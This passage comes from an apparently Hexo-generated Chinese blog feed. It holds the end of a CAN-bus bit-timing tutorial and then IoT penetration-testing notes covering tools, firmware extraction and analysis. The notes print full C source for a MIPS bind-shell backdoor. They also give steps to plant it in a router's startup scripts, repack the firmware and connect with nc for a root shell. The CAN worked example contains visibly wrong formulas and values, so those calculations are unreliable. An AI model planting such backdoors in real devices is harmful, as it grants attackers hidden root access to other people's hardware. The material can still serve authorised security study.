过载帧和错误帧的前面不能插入帧间隔。</p><p>帧间隔有两种不同的形式：<br>主动错误状态的帧间隔：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%B8%BB%E5%8A%A8%E9%94%99%E8%AF%AF%E7%8A%B6%E6%80%81%E7%9A%84%E5%B8%A7%E9%97%B4%E9%9A%94.png" class=""><p>被动错误状态的帧间隔：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E8%A2%AB%E5%8A%A8%E9%94%99%E8%AF%AF%E7%8A%B6%E6%80%81%E7%9A%84%E5%B8%A7%E9%97%B4%E9%9A%94.png" class=""><p><strong>间隔段</strong>：<br>连续三个隐性位；间隔段期间，所有节点不允许发送数据这或遥控帧，只要在这期间监听到显性位，接收节点就会发送过载帧。</p><p><strong>空闲段</strong>：<br>连续隐性位，个数不一定，0个或者多个都可以。总线空闲的时间是任意长的，只要总线空闲，节点就可以竞争总线。</p><p><strong>暂停段</strong>:<br>只有处于被动错误状态的节点在发送帧间隔的时候，才会在帧间隔中插入8个连续隐性位的暂停段。</p><p><strong>暂停段，又叫做延迟传送段，为什么节点处于被动状态时会有这样一段呢。</strong><br>=====&gt;<br>原因如下:<br>首先，考虑主动错误状态的节点Node_A，发送主动错误标志之后，随之就要重新发送刚刚发送失败的报文，<br>但是为了间隔开与前面刚刚发送的错误帧，总线在错误帧之后就会插入３个隐形位的帧间隔，<br>在这３个隐形位期间，其它的节点不足以判定总线空闲（需要连续11个隐性位才能判定），<br>所以Node_A仍然占据着总线的控制权，<br>于是在帧间隔之后，Node_A能够接着发送报文。</p><p>现在Node_A转入到被动错误状态了，说明它已经不是很可靠了，<br>这个时候如果没有延迟传送段，在Node_A发出被动错误标志之后，它仍然能够在3位的帧间隔之后立即重新发送报文，<br>这是不符合我们对被动错误状态的处理要求的当然也是不符合CAN协议的，<br>于是乎对于发送出被动错误标志的节点，总线在帧间隔中加入了８个连续隐性位的延迟传送段，这样的3+8=11个连续隐性位。<br>就能让Node_A在这个帧间隔期间失去对总线的控制权，从而优先保证其它正常(处于主动错误状态)节点能够使用总线，<br>而不必等着一个已经不可靠的Node_A占据总线。</p><h3 id="4-5-CAN通信的位定时与同步"><a href="#4-5-CAN通信的位定时与同步" class="headerlink" title="4.5 CAN通信的位定时与同步"></a>4.5 CAN通信的位定时与同步</h3><h4 id="4-5-1-位定时"><a href="#4-5-1-位定时" class="headerlink" title="4.5.1 位定时"></a>4.5.1 位定时</h4><h5 id="4-5-1-1-比特率和波特率"><a href="#4-5-1-1-比特率和波特率" class="headerlink" title="4.5.1.1 比特率和波特率"></a>4.5.1.1 比特率和波特率</h5><ol><li><strong>位速率</strong><br>又叫做比特率（bit rata）、信息传输率，<br>表示的是单位时间内，总线上传输的信息量，即每秒能够传输的二进制位的数量，<br>单位是bit per second。</li><li><strong>波特率</strong><br>又叫做传码率、信号传输率，表示的是单位时间内传输的码元的数量，<br>当两相调制时，一个码元用一个二进制位表示，此时波特率在数值上和比特率是一样的，CAN总线正是两项调制这种情况。</li></ol><p>Tips: 比特率和波特率并不是一回事儿，这一定一定要牢记</p><h5 id="4-5-1-2-位时间"><a href="#4-5-1-2-位时间" class="headerlink" title="4.5.1.2 位时间"></a>4.5.1.2 位时间</h5><h6 id="4-5-1-2-1-位时间的概念"><a href="#4-5-1-2-1-位时间的概念" class="headerlink" title="4.5.1.2.1 位时间的概念"></a>4.5.1.2.1 位时间的概念</h6><p>位时间：表示的是一个二进制位在总线上传输时所需要的时间。<br>所以：<br>位速率 = 1 / 位时间</p><p>首先了解以下CAN总线系统中的两个时钟：晶振时钟周期 和 CAN时钟周期</p><ol><li><strong>晶振时钟周期</strong><br>是由单片机振荡器的晶振频率决定的，指的是振荡器每震荡一次所消耗的时间长度，也是整个系统中最小的时间单位。</li><li><strong>CAN时钟周期</strong><br>CAN时钟是由系统时钟分频而来的一个时间长度值，实际上就是一个时间份额Tq。</li></ol><p>可以按照下面的公式计算： CAN时钟周期 = 2 × 晶振时钟周期 × BRP<br>其中BRP叫做波特率预分频值（baudrate prescaler）。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BD%8D%E6%97%B6%E9%97%B4%E7%9A%84%E6%A6%82%E5%BF%B5.png" class=""><h6 id="4-5-1-2-2-位时间的分段"><a href="#4-5-1-2-2-位时间的分段" class="headerlink" title="4.5.1.2.2 位时间的分段"></a>4.5.1.2.2 位时间的分段</h6><p>如上文所述，在CAN的位定时中，一个CAN时钟周期称为一个时间量子 — Tq。<br>如下图所示：<br>位时间分为四个段：同步段、传播段、相位缓冲段1、相位缓冲段2，总共8~25个时间量子（Tq）</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BD%8D%E6%97%B6%E9%97%B4%E7%9A%84%E5%88%86%E6%AE%B5.png" class=""><p><strong>1）同步段（Synchronization Segment）</strong><br>长度固定，1个时间量子Tq；<br>一个位的传输从同步段开始；<br>同步段用于同步总线上的各个节点，一个位的跳边沿在此时间段内。</p><p><strong>2）传播段（Propagation Segment）</strong><br>传播段用于补偿报文在总线和节点上传输时所产生的时间延迟；<br>传播段时长 ≥ 2 × 报文在总线和节点上传输时产生的时间延迟 ；<br>传播段时长可编程（1~8个时间量子Tq）。</p><p><strong>3）相位缓冲段1（Phase Buffer Segment1）</strong><br>用于补偿节点间的晶振误差；<br>允许通过重同步对该段加长；<br>在这个时间段的末端进行总线状态的采样；<br>长度可编程（1~8个时间量子Tq）</p><p><strong>4）相位缓冲段2（Phase Buffer Segment2）</strong><br>用于补偿节点间的晶振误差；<br>允许通过重同步对该段缩短；<br>长度可编程（1~8个时间量子Tq）</p><p>于是 tBit = tSS + tPS +tPBS1 + tPBS2<br>tBit:位时间<br>tSS:同步段时间<br>tPS:传播段时间<br>tPBS1:时间段1<br>tPBS2:时间段2</p><h4 id="4-5-2-CAN的同步机制"><a href="#4-5-2-CAN的同步机制" class="headerlink" title="4.5.2 CAN的同步机制"></a>4.5.2 CAN的同步机制</h4><p>在CAN通信中，有两种同步机制：硬同步 与 重同步。</p><h5 id="4-5-2-1-同步的规则"><a href="#4-5-2-1-同步的规则" class="headerlink" title="4.5.2.1  同步的规则"></a>4.5.2.1  同步的规则</h5><p>☆ 一个位时间内只允许一种同步方式，要么硬同步要么重同步；<br>☆ 任何一个从“隐性”到“显性”的下降沿 都可以用于同步；<br>☆ 硬同步发生在报文的SOF位，所有接收节点调整各自当前位的同步段，使其位于发送的SOF位内；<br>☆ 重同步发生在一个报文SOF位之外的其它段，当下降沿落在了同步段之外时发生重同步；<br>☆ 在SOF到仲裁场发送的时间段内，如果有多个节点同时发送报文，那么这些发送节点对跳变沿不进行重同步</p><h5 id="4-5-2-2-硬同步"><a href="#4-5-2-2-硬同步" class="headerlink" title="4.5.2.2 硬同步"></a>4.5.2.2 硬同步</h5><p>硬同步发生在SOF位，所有接收节点调整各自当前位的同步段，调整宽度不限</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E7%A1%AC%E5%90%8C%E6%AD%A5.png" class=""><p>（1）发送节点Node_A在发送SOF位时，SOF位的下降沿在SS段；<br>（2）这个时候接收节点Node_B发现自己当前位的SS段和发送节点SOF位的SS段不同步。也就是说当Node_A产生SOF位SS段时，Node_B的当前位的SS段已经在5个Tq之前产生了；<br>（3）于是接收节点Node_B强行将自己当前位的SS段拉到与SOF位的SS段同步。</p><h5 id="4-5-2-3-重同步"><a href="#4-5-2-3-重同步" class="headerlink" title="4.5.2.3 重同步"></a>4.5.2.3 重同步</h5><p>重同步发生在一个报文SOF位之外的其它位场内，<br>当接收节点Node_B当前位的下降沿落在了发送节点Node_A当前位的同步段之外时发生重同步。<br>重同步会导致相位缓冲段1的延长或者相位缓冲段2的缩短，从而保证采样点的准确。</p><h6 id="4-5-2-3-1-PBS1延长"><a href="#4-5-2-3-1-PBS1延长" class="headerlink" title="4.5.2.3.1 PBS1延长"></a>4.5.2.3.1 PBS1延长</h6><p>发的晚（慢），收的早（块），导致PBS1延长。</p> <p>如上图所示：<br>（1）发送节点Node_A比接收节点Node_B的时间慢了，也就是说Node_A当前位的ss段产生的时候，Node_B 当前位的ss段已经在2个Tq之前产生了；<br>（2）所以这个时候接收节点Node_B就将PBS1延长2个Tq的时间；<br>（3）于是这个时候Node_A当前位的采样点就和Node_B的采样点同步了。</p><h6 id="4-5-2-3-2-PBS2缩短"><a href="#4-5-2-3-2-PBS2缩短" class="headerlink" title="4.5.2.3.2 PBS2缩短"></a>4.5.2.3.2 PBS2缩短</h6><p>发的早（快），收的晚（慢），导致PBS2缩短。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/PBS2%E7%BC%A9%E7%9F%AD.png" class=""><p>如上图所示：<br>（1）发送节点Node_A当前位的SS段诞生2Tq时长之后，接收节点Node_B的当前位才产生SS段；<br>（2）于是，接收节点Node_B当前位的PBS2段缩短，<br>（3）这样就会导致接收节点Node_B的下一位能够提前2个Tq，从而Node_B的下一位采样点和Node_A下一位的采样点能够同步。</p><h6 id="4-5-2-3-3-同步跳转宽度"><a href="#4-5-2-3-3-同步跳转宽度" class="headerlink" title="4.5.2.3.3 同步跳转宽度"></a>4.5.2.3.3 同步跳转宽度</h6><p>在重同步时，有个同步跳转宽度（SJW，Synchro Jump Width）的概念，表示的是PBS1和PBS2重同步时允许跳转的最大宽度。<br>同步跳转宽度必须满足以下几个条件：</p><p>SJW必须小于PBS1和PBS2的最小值<br>SJW最大值不能超过4</p><h4 id="4-5-3-位定时参数的确定"><a href="#4-5-3-位定时参数的确定" class="headerlink" title="4.5.3 位定时参数的确定"></a>4.5.3 位定时参数的确定</h4><p>位定时的参数主要涉及以下几个：<br>（1）位速率：单位为bps、Kbps、Mbps<br>1Mbps = 1000Kbps = 1000000bps</p><p>（2）位时间：tBit，单位一般为纳秒(ns)<br>tBit =1 / 位速率</p><p>（3）时间量子Tq：<br>Tq =1 / NBT<br>NBT 表示的是一个位时间tBit内包含Tq的个数。</p><p>（4）传输延迟时间tPTS<br>CAN报文在CAN总线上的传输时，物理延迟包含两个部分：<br>在CAN-BUS上传输造成的延迟<br>在节点上传输造成延迟</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BD%8D%E5%AE%9A%E6%97%B6%E5%8F%82%E6%95%B0%E7%9A%84%E7%A1%AE%E5%AE%9A.png" class=""><p>按照CAN通信协议的规定，补偿给传播延迟的时间长度要至少等于实际实际传播延迟时长的2倍，即：<br>tPTS ≥ 2 × tdel = 2 × ( tdel + tBus )</p><p>需要注意的是：<br>Tips: 在CAN总线通信系统中是以时间量子Tq来度量时间的，所以如果延迟补偿时间 tPTS = 3.1Tq，那么这个时候要取：tPTS = 4Tq。</p><p>（5）相位缓冲段<br>相位缓冲段的时间长度分为两种情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (NBT<span class="hljs-number">-1</span>-tPTS_Tq)/<span class="hljs-number">2</span>==偶数<br>    PBS1_Tq = PBS2_Tq = (NBT<span class="hljs-number">-1</span>-tPTS_Tq)/<span class="hljs-number">2</span><br><span class="hljs-keyword">else</span><br>    PBS1_Tq = (NBT<span class="hljs-number">-1</span>-tPTS_Tq)/<span class="hljs-number">2</span><br>    PBS2_Tq = PBS1_Tq + <span class="hljs-number">1</span><br><span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure><p>(6) 同步跳转宽度<br>SJW = min ( PBS1_Tq , 4 )</p><p>(7) 验证晶振误差Df<br>CAN总线的晶振误差必须同时满足下面三个条件：</p><p>Df &lt;= SJW / (2×10×NBT)<br>Df &lt;= min(PBS1_Tq,PBS2_Tq) / ( 2×(13×NBT−PBS2_Tq) )<br>Df ≤ 1.58%</p><h4 id="4-5-4-例子"><a href="#4-5-4-例子" class="headerlink" title="4.5.4 例子"></a>4.5.4 例子</h4><p>以下面的例子来讲述位定时参数的确定方法：<br>MCU晶振16MHz，位速率1Mbps，总线长度20m，单位总线延迟5ns/m，物理接口的发送接收延迟150ns</p><p>（1）晶振时钟周期：T=1s/16MHz = 62.5ns</p><p>（2）位时间 ：tBit = 1/1Mbps = 1000ns</p><p>（3）BPR和NBT：考虑到 T = 125ns，tBit = 1000ns，所以BPR只能取值为1，才能满足NBT∈[8,25],于是预分频数BPR=1；</p><p>（4）CAN时钟周期Tq = 2 × 62.5 × 1 = 125ns</p><p>（5）NBT = 8</p><p>（6）传输延迟时间tPTS ———— tPTS = 2 ×（ 20 × 5 + 150 ）= 500ns<br>所以<br>tPTS_Tq = tPTS / Tq = 500 / 125=4</p><p>于是NBT=8个Tq的长度中需要有4个Tq用于补偿传播延迟，于是还剩下4个Tq，<br>SS同步段长度固定占据1个Tq，还剩3个Tq，于是PBS1分配一个Tq，PBS2分配2个Tq。</p><p>（7）同步跳转宽度 SJW=min{PBS1,4}=1</p><p>（8）晶振误差<br>Df &lt;= SJW / (2×10×NBT) = 1 / (2×10×8)=0.00625</p><p>Df &lt;= min(PBS1_Tq,PBS2_Tq) / ( 2×(13×NBT−PBS2_Tq) ) = 12 × ( 13×8 − 2) = 0.00490</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/weixin_40528417/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">79534483</span><br>公众号-嘴哥有料<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
      <tag>车联网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IOT渗透测试总结</title>
    <link href="/2021/08/22/IOT%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93/"/>
    <url>/2021/08/22/IOT%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="1-工具"><a href="#1-工具" class="headerlink" title="1. 工具"></a>1. 工具</h1><h2 id="1-1-固件分析"><a href="#1-1-固件分析" class="headerlink" title="1.1 固件分析"></a>1.1 固件分析</h2><ol><li>Binwalk</li><li>Firmadyne</li><li>Angr</li><li>Firmware-mod-tookit</li><li>Firmware Analysis Toolkit</li><li>GDB</li><li>Radare2</li><li>Binary Analysus Tool（BAT）</li><li>Qemu</li><li>IDA Pro</li></ol><h2 id="1-2-Web渗透测试工具"><a href="#1-2-Web渗透测试工具" class="headerlink" title="1.2 Web渗透测试工具"></a>1.2 Web渗透测试工具</h2><ol><li>Burp Suite</li><li>OWASP Zed Attsvk Proxy（ZAP）</li><li>PEST Easy Firefox Plugin</li><li>Postman Chrome Extension</li></ol><h2 id="1-3-移动应用渗透测试工具"><a href="#1-3-移动应用渗透测试工具" class="headerlink" title="1.3 移动应用渗透测试工具"></a>1.3 移动应用渗透测试工具</h2><ul><li>Android<ol><li>Android SDK</li><li>JD-GUI</li><li>JEB</li><li>SQLite Browser</li><li>Burp Suite</li><li>OWASP ZAP</li></ol></li><li>IOS<ol><li>IDB</li><li>Xcode Tools</li><li>CLass-Dump</li><li>Hopper</li><li>Mob-SF</li><li>SQLite Browser</li><li>Burp Suite</li><li>OWASP ZAP</li><li>Cydia (以下应用需要越狱环境)</li><li>OpenURL</li><li>DumpDecrypted</li><li>Ipainstaller</li><li>SSL KILL Switch 2</li><li>Clutch 2</li><li>Cycript</li></ol></li></ul><h2 id="1-4-硬件工具"><a href="#1-4-硬件工具" class="headerlink" title="1.4 硬件工具"></a>1.4 硬件工具</h2><ol><li>万用表</li><li>用于硬件拆解的IFixit clasic pro tech toolkit工具套装</li><li>Bus Pirate</li><li>USB转串口转接器：Shikra、FTDIDT232、CP2012、PL2303、Adafruit FTDI Friend</li><li>JTAG接口转接器：Shikra、JTAGulator、Arduino with JTAGenum、JLINK、Bus Blaster</li><li>逻辑分析仪</li></ol><h2 id="1-5-硬件分析工具"><a href="#1-5-硬件分析工具" class="headerlink" title="1.5 硬件分析工具"></a>1.5 硬件分析工具</h2><ol><li>OpenOCD</li><li>Spiflash</li><li>Minicom</li><li>Baudrate</li></ol><h2 id="1-6-无线电分析硬件工具"><a href="#1-6-无线电分析硬件工具" class="headerlink" title="1.6 无线电分析硬件工具"></a>1.6 无线电分析硬件工具</h2><ol><li>Atmel RZ Raven</li><li>Attify Badge</li><li>HackRF One</li><li>Yardstick One</li><li>带有Xbee Shield模块的XBee扩展版</li><li>Ubertooth</li><li>BLE适配器</li></ol><h2 id="1-7-无线电分析软件"><a href="#1-7-无线电分析软件" class="headerlink" title="1.7 无线电分析软件"></a>1.7 无线电分析软件</h2><ol><li>KillerBee框架</li><li>Attify ZigBee框架</li><li>GUN Radio</li><li>GQRX</li><li>Ubertooth tools</li><li>Blue Hydra</li><li>RTL-sdr</li><li>Hackrf packages</li><li>EZ-ware</li></ol><h1 id="2-固件分析"><a href="#2-固件分析" class="headerlink" title="2. 固件分析"></a>2. 固件分析</h1><p>固件中的内部组织包括boot-loader、内核、文件系统以及其他内容。</p><p>文件系统主要关注内容：</p><ul><li>口令</li><li>API Token</li><li>URL</li><li>存在漏洞的服务</li><li>后门账户</li><li>配置文件</li><li>源代码</li><li>私钥</li><li>数据存储方式</li></ul><h2 id="2-1-固件提取"><a href="#2-1-固件提取" class="headerlink" title="2.1 固件提取"></a>2.1 固件提取</h2><ol><li><p>从厂商网站下载</p></li><li><p>代理或设备更新时的流量</p><p>ettercap+wireshark</p></li><li><p>直接从设备转储固件</p><p>通过UART、SPI、JTAG接口直接转储或闪存芯片读取</p></li><li><p>Google搜索</p></li></ol><h2 id="2-2-文件系统读取"><a href="#2-2-文件系统读取" class="headerlink" title="2.2 文件系统读取"></a>2.2 文件系统读取</h2><p>以Squashfs系统为例，头部特征字符串较多，目前已知7种：</p><ol><li>标准固件大端序模式位-sqsh</li><li>标准固件小端序模式-hsqs</li><li>LZMA压缩下的大端模式-sqlz</li><li>3.3版本的Squashfs文件系统在LZMA压缩下的大端序模式-qshs</li><li>部门非标准固件小端序模式-shsq（多为D-Link固件）</li><li>DD-WRT固件小端序模式-hsqt</li><li>DD-WRT固件大端序模式-tqsh</li></ol><h3 id="2-2-1-Squashfs文件系统提取"><a href="#2-2-1-Squashfs文件系统提取" class="headerlink" title="2.2.1 Squashfs文件系统提取"></a>2.2.1 Squashfs文件系统提取</h3><h4 id="2-2-1-1-unSquashfs提取"><a href="#2-2-1-1-unSquashfs提取" class="headerlink" title="2.2.1.1 unSquashfs提取"></a>2.2.1.1 unSquashfs提取</h4><ol><li><p>根据特征值使用hexdump获取Squashfs文件系统起始地址。</p><p>hexdump -c xxxx.trx |grep -i ‘hsqs’</p></li><li><p>dd转存文件系统</p><p>dd if=xxx bs=1 skip=xxx of=xx</p></li><li><p>二进制文件提取文件系统</p><p>Unsquashfs  xxxx</p></li></ol><h4 id="2-2-1-2-binwalk提取"><a href="#2-2-1-2-binwalk提取" class="headerlink" title="2.2.1.2 binwalk提取"></a>2.2.1.2 binwalk提取</h4><p>binwalk提取与第一种提取思路一样，binwalk会判断目标文件系统，根据特征值进行转存，然后从二进制种提取文件系统</p><p>binwalk -Me xxx</p><h2 id="2-3-文件系统分析"><a href="#2-3-文件系统分析" class="headerlink" title="2.3 文件系统分析"></a>2.3 文件系统分析</h2><h4 id="2-3-1-手工分析"><a href="#2-3-1-手工分析" class="headerlink" title="2.3.1 手工分析"></a>2.3.1 手工分析</h4><ol><li><p>find *.conf查找配置文件。</p></li><li><p>查找key、ras、des、cer等关键字。</p></li></ol><h4 id="2-3-2-自动化"><a href="#2-3-2-自动化" class="headerlink" title="2.3.2 自动化"></a>2.3.2 自动化</h4><p>自动搜索敏感信息</p><p><a href="https://github.com/craigz28/firmwalker">firmwalker</a></p><h4 id="2-3-3-固件仿真动态分析"><a href="#2-3-3-固件仿真动态分析" class="headerlink" title="2.3.3 固件仿真动态分析"></a>2.3.3 固件仿真动态分析</h4><p><a href="https://github.com/attify/firmware-analysis-toolkit">Firmware Analysis Toolkit</a>（FAT）采用Firmadyne工具实现镜像仿真。</p><p>Firmadyne底层基于QEMU虚拟机，用户能够对整个系统架构进行仿真并在该架构之上运行固件。</p><p>FAT脚本能够执行的操作:</p><ul><li>从固件系统提取文件系统</li><li>获取固件架构</li><li>制作所需镜像</li><li>网络设置</li><li>镜像仿真</li></ul><h4 id="2-3-4-二进制逆向分析"><a href="#2-3-4-二进制逆向分析" class="headerlink" title="2.3.4 二进制逆向分析"></a>2.3.4 二进制逆向分析</h4><p>Radar2、IDA、Hopper</p><h4 id="2-3-5-后门植入"><a href="#2-3-5-后门植入" class="headerlink" title="2.3.5 后门植入"></a>2.3.5 后门植入</h4><p><a href="https://github.com/rampageX/firmware-mod-kit">firmware-mod-kit</a>（FMK）,支持从固件提取文件系统，对其修改后重新打包。</p><ol><li><p>extract-firmware.sh  -文件系统提取</p><p>提取后包括rootfs、image_part和logs等文件，其中rootfs中包含了固件中的整套文件系统，我们需要做的是在固件中添加后门，然后找到固件启动后自动调用后门的方法。</p></li><li><p>readelf查看文件文件系统内的可执行文件，判断是大端架构还是小端架构</p></li><li><p>使用MIPS交叉编译器编译后门源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;netinet/in.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SERVER_PORT9999</span><br> <span class="hljs-comment">/* CC-BY: Osanda Malith Jayathissa (@OsandaMalith)</span><br><span class="hljs-comment">  * Bind Shell using Fork for my TP-Link mr3020 router running busybox</span><br><span class="hljs-comment">  * Arch : MIPS</span><br><span class="hljs-comment">  * mips-linux-gnu-gcc mybindshell.c -o mybindshell -static -EB -march=24kc</span><br><span class="hljs-comment">  */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">int</span> serverfd, clientfd, server_pid, i = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> *banner = <span class="hljs-string">&quot;[~] Welcome to @OsandaMalith&#x27;s Bind Shell\n&quot;</span>;<br><span class="hljs-keyword">char</span> *args[] = &#123; <span class="hljs-string">&quot;/bin/busybox&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, (<span class="hljs-keyword">char</span> *) <span class="hljs-number">0</span> &#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">server</span>, <span class="hljs-title">client</span>;</span><br><span class="hljs-keyword">socklen_t</span> len;<br><br>server.sin_family = AF_INET;<br>server.sin_port = htons(SERVER_PORT);<br>server.sin_addr.s_addr = INADDR_ANY; <br><br>serverfd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>bind(serverfd, (struct sockaddr *)&amp;server, <span class="hljs-keyword">sizeof</span>(server));<br>listen(serverfd, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123; <br>    len = <span class="hljs-keyword">sizeof</span>(struct sockaddr);<br>    clientfd = accept(serverfd, (struct sockaddr *)&amp;client, &amp;len);<br>        server_pid = fork(); <br>        <span class="hljs-keyword">if</span> (server_pid) &#123; <br>        write(clientfd, banner,  <span class="hljs-built_in">strlen</span>(banner));<br>        <span class="hljs-keyword">for</span>(; i &lt;<span class="hljs-number">3</span> <span class="hljs-comment">/*u*/</span>; i++) dup2(clientfd, i);<br>        execve(<span class="hljs-string">&quot;/bin/busybox&quot;</span>, args, (<span class="hljs-keyword">char</span> *) <span class="hljs-number">0</span>);<br>        close(clientfd); <br>    &#125; close(clientfd);<br>    &#125; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>将编译好的二进制文件放到文件系统中，修改/etc/scripts下的system.sh</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">/etc/binshell        <span class="hljs-comment">//bindshell为编译后的后门二进制文件</span><br></code></pre></td></tr></table></figure></li><li><p>重新打包</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">build-firmware.sh </span>文件名 -<span class="hljs-keyword">nopad </span>-min<br></code></pre></td></tr></table></figure></li><li><p>Firmware-name/文件下生成新的固件</p></li><li><p>安装固件，使用nc连接，获得root权限shell</p></li></ol><h1 id="3-设备攻击"><a href="#3-设备攻击" class="headerlink" title="3. 设备攻击"></a>3. 设备攻击</h1><p>硬件攻击主要涉及以下步骤：</p><ul><li>信息收集与分析</li><li>设备的外部分析与内部分析</li><li>通信接口识别</li><li>硬件通讯技术获取数据</li><li>基于硬件漏洞利用方法的软件漏洞利用</li><li>后门植入</li></ul><h2 id="3-1-信息收集与分析"><a href="#3-1-信息收集与分析" class="headerlink" title="3.1 信息收集与分析"></a>3.1 信息收集与分析</h2><p>对于某一特定设备而言，可以通过一系列方法获取相关目标设别的信息，此时的信息来源既包括公开查询的信息，也可以是从客户手里或者其他渠道获取的文档。</p><p>涉及的信息主要包括：</p><ul><li>嵌入式设备基于哪种架构？</li><li>该设备运行在何种操作系统上？</li><li>该设备支持哪些外设？</li><li>该设备采用了哪些芯片组？</li><li>设备采用的存储与内存的实现方面的细节。</li><li>关于设备的其他相关技术信息。</li></ul><h2 id="3-2-外部分析与内部分析"><a href="#3-2-外部分析与内部分析" class="headerlink" title="3.2 外部分析与内部分析"></a>3.2 外部分析与内部分析</h2><p>获取设备信息后，下一步针对设备自身开展分析工作，这一步的目的在于从攻击者的视角来观察设备，并从外部和内部观察，尽可能获取更多的信息。</p><p>外部分析只需要查看设备的外观，搞清楚每个组件的作用。</p><ul><li><p>设备有哪些接口，是否提供USB接口、SD卡槽或以太网口？</p></li><li><p>设备如何供电，电池、POE还是电源适配器？</p></li><li><p>设备设否有标签？有标签的话，包含了哪些信息？</p><p> 完成外部分析后，下一步就是对设备进行内部分析，需要打开外壳观察PCB板，这一步骤我们需要识别出设备所采用的各种芯片组，继而在芯片数据手册中查找对应的芯片组，了解每个组件的功能，同时将芯片数据手册中找到的各种信息做好记录。</p></li></ul><h2 id="3-3-通信接口识别"><a href="#3-3-通信接口识别" class="headerlink" title="3.3 通信接口识别"></a>3.3 通信接口识别</h2><p>​    有一些设备接口显而易见，可以轻松识别，但是另外一些情况下，通信接口可能会分布PCB的不同位置，所以识别起来可能会困难一下，还有些情况下需要自行连接到芯片的引脚排针才能识别的接口类型。</p><h2 id="3-4-硬件通信技术获取数据"><a href="#3-4-硬件通信技术获取数据" class="headerlink" title="3.4 硬件通信技术获取数据"></a>3.4 硬件通信技术获取数据</h2><p>识别出硬件采用的通信协议后与接口后，就可以借助专门工具通过特定协议与目标设备进行通信，并且与目标设备进行交互或读写芯片信息。</p><p>测试过程中常用到的接口包括UART、JTAG、SPI、I2C、SWD、RDI以及1-Wire</p><h2 id="3-5-硬件分析"><a href="#3-5-硬件分析" class="headerlink" title="3.5 硬件分析"></a>3.5 